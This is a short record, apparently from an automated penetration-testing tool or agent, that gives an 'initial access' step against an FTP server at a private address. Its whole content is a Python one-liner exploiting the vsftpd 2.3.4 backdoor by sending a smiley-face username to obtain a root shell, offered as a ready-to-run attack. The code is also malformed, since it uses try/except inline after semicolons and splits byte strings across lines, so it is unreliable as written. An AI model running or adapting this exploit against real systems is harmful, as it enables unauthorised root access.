initial_access.description: Direct Python exploit of vsftpd 2.3.4 backdoor to gain root shell
initial_access.command:
python3 -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(10); try: s.connect(("192.168.56.5", 21)); s.recv(1024); s.send(b"USER anonymous
"); s.recv(1024); s.send(b"PASS anonymous
"); s.recv(1024); s.send(b"USER :)
"); data = s.recv(1024); print("SUCCESS: vsftpd backdoor triggered"); print(data.decode()); s.close(); except socket.timeout: print("FAILED: Connection timed out"); except Exception as e: print(f"FAILED: {e}")'
